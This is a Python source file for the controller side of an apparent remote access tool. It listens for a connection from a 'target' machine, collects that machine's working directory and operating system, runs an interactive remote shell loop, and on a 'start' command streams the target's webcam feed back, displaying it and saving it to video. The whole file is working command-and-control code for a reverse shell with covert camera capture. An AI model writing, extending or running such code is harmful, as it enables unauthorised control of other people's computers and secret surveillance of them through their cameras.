import socket
import cv2
import signal
import threading
import numpy as np 

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 4000
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

sock = socket.socket()
sock.bind((SERVER_HOST, SERVER_PORT))
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.listen(5)

print(f"Listening as {SERVER_HOST} on port {SERVER_PORT} ...")
client_socket, client_address = sock.accept()

print(f"{client_address[0]}:{client_address[1]} Connected!")

cwd = client_socket.recv(10).decode()
print(f"[+] Current working directory: {cwd}")

target_os = client_socket.recv(1024).decode()
print(f"[+] Target's operating system: {target_os}")

cap = None
out = None
recording_thread = None

def signal_handler(sig, frame):
    print("Saving video and existing...")
    if recording_thread is not None:
        recording_thread.join()
    if cap is not None and out is not None:
        cap.release()
        out.release()
    cv2.destroyAllWindows()
    client_socket.close()
    sock.close()
    exit(0)

signal.signal(signal.SIGINT, signal_handler)

def record_video():
    global out
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter('output.mp4', fourcc, 30.0, (640, 480))
    while True:
        frame_size = int.from_bytes(client_socket.recv(4), byteorder='little')
        frame_data = b''
        while len(frame_data) < frame_size:
            packet = client_socket.recv(min(BUFFER_SIZE, frame_size - len(frame_data)))
            if not packet:
                break
            frame_data += packet
        if not frame_data:
            break
        frame = cv2.imdecode(np.frombuffer(frame_data, dtype=np.uint8), cv2.IMREAD_COLOR)
        out.write(frame)
        cv2.imshow('Remote camera feed', frame)
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break
    out.release()
    client_socket.close()
    cv2.destroyAllWindows()

while True:
    command = input(f"{cwd} $> ")
    if not command.strip():
        continue
    client_socket.send(command.encode())
    if command.lower() == "exit":
        break
    elif command.lower() == "start":
        recording_thread = threading.Thread(target=record_video)
        recording_thread.start()
        output = "Video recording started."
        print(output)
    else:
        output = client_socket.recv(BUFFER_SIZE).decode()
        results, cwd = output.split(SEPARATOR)
        print(results)
            
if recording_thread is not None:
    recording_thread.join()
client_socket.close()
sock.close()
